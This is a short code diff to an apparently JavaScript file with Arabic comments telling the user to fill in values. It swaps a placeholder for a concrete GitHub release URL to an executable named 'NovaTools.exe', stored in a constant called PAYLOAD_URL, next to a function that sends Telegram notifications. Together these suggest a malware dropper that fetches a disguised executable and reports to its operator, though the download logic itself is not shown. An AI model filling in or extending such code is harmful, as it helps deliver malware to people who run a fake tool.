@@ -3,7 +3,7 @@
  * ============================================================ */
 
 /* ▼▼▼ املأ القيم هنا ▼▼▼ */
-const PAYLOAD_URL = "https://github.com/USERNAME/REPO/releases/latest/download/NovaTools.exe";
+const PAYLOAD_URL = "https://github.com/lakacam873-commits/FPI/releases/latest/download/NovaTools.exe";
 /* ▲▲▲ املأ القيم هنا ▲▲▲ */
 
 function notifyTelegram(text) {
